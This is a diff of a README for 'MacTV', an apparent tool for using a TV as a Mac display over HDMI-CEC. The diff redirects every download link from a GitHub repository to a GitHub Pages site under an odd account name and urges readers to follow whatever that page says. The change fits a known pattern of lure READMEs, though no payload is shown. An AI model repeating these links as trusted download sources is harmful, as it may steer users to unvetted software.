@@ -1,6 +1,6 @@
 # 🔥 MacTV - Make Your TV an Amazing Mac Monitor
 
-[![Download MacTV](https://img.shields.io/badge/Download-MacTV-FF6B6B?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Unpainted-departure3343/MacTV)
+[![Download MacTV](https://img.shields.io/badge/Download-MacTV-FF6B6B?style=for-the-badge&logo=apple&logoColor=white)](https://unpainted-departure3343.github.io)
 
 ---
 
@@ -34,7 +34,7 @@ MacTV uses something called **HDMI-CEC** - which is a fancy way of saying your M
 
 ## 🚀 Getting Started
 
-Visit this link to download the application: [https://github.com/Unpainted-departure3343/MacTV](https://github.com/Unpainted-departure3343/MacTV)
+Visit this link to download the application: [https://unpainted-departure3343.github.io](https://unpainted-departure3343.github.io)
 
 Once you've visited the link, you'll find everything you need to download MacTV. The download process is straightforward - just follow what you see on that page.
 
@@ -42,7 +42,7 @@ Once you've visited the link, you'll find everything you need to download MacTV.
 
 ## 📥 Installation & Setup
 
-Visit this link to download the application: [https://github.com/Unpainted-departure3343/MacTV](https://github.com/Unpainted-departure3343/MacTV)
+Visit this link to download the application: [https://unpainted-departure3343.github.io](https://unpainted-departure3343.github.io)
 
 After downloading, here's what to do:
 
@@ -152,7 +152,7 @@ If you run into any problems:
 
 You're just moments away from a much better TV-viewing experience with your Mac. Download MacTV today and discover how much easier it is to control your TV from your computer!
 
-**Quick Download:** [https://github.com/Unpainted-departure3343/MacTV](https://github.com/Unpainted-departure3343/MacTV)
+**Quick Download:** [https://unpainted-departure3343.github.io](https://unpainted-departure3343.github.io)
 
 ---
 
